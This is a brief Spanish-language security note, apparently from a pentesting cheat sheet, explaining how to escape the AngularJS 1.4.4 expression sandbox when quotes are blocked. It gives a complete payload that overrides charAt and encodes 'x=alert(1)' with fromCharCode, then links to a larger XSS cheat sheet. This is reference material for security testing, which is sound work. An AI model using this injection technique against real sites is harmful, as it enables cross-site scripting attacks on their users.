AngularJS tiene un contexto de Sandbox que impide a atacantes ejecutar código que pueda perjudicar la seguridad, debido esto se desarrollaron diferentes payloads para saltarse esta seguridad, dependiendo de las necesidades:
## Cuando no se pueden poner comillas

(Solo en versiones de AngularJS 1.4.4)

```js
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

La ultima lista de números se le conoce como CharCode, y pasandolo a texto seria algo asi como:

```js
x=alert(1)
```

Encuentra mas payloads [aquí](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)



